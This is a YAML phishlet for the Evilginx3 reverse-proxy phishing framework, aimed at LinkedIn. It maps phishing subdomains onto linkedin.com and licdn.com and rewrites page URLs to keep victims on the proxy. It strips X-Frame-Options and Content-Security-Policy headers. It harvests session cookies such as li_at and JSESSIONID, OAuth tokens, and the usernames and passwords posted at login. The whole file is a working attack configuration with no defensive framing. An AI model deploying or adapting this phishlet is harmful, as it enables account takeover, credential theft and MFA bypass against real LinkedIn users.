min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.linkedin.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'linkedin.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'licdn.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'media', orig_sub: 'media', domain: 'licdn.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'linkedin.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Replace LinkedIn domain URLs
  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://www\\.linkedin\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'api', domain: 'linkedin.com', search: 'https://api\\.linkedin\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: 'https://platform\\.linkedin\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace LinkedIn CDN URLs
  - {triggers_on: 'www.linkedin.com', orig_sub: 'static', domain: 'licdn.com', search: 'https://static\\.licdn\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'media', domain: 'licdn.com', search: 'https://media\\.licdn\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'api', domain: 'linkedin.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.linkedin.com', orig_sub: 'api', domain: 'linkedin.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary LinkedIn authentication cookies
  - domain: '.linkedin.com'
    keys: ['li_at', 'JSESSIONID', 'liap', 'bcookie', 'bscookie', 'lang', 'lidc', 'UserMatchHistory']
    type: 'cookie'
  
  # OAuth tokens for API access
  - domain: '.linkedin.com'
    keys: ['oauth_token', 'oauth_token_secret', 'li_oauth']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'session_key'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'session_password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'session_key'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'session_key'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/feed/'
  - '^/mynetwork/'
  - '^/jobs/'
  - '^/messaging/'
  - '^/in/'
  - '^/company/'

login:
  domain: 'www.linkedin.com'
  path: '/'

